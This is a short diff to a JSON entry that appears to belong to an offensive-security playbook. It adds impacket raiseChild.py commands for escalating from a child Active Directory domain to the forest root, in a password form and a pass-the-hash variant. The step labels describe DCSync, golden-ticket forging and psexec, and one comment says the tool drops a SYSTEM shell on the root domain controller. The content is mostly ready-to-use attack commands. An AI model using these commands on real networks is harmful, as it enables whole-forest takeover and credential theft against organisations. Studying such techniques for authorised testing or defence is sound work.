@@ -77,5 +77,21 @@
   },
   "tools": [
     "impacket"
+  ],
+  "variations": [
+    {
+      "label": "Pass-the-hash instead of password",
+      "command": "raiseChild.py -target-exec <parent_dc_ip> <child_domain>/<child_admin> -hashes <lm>:<nt>"
+    }
+  ],
+  "steps": [
+    {
+      "label": "Automated child->parent (DCSync + golden + psexec)",
+      "command": "raiseChild.py -target-exec <parent_dc_ip> <child_domain>/<child_admin>:<password>"
+    },
+    {
+      "label": "Confirm EA on the parent",
+      "command": "# raiseChild drops a SYSTEM shell on the forest root DC"
+    }
   ]
 }
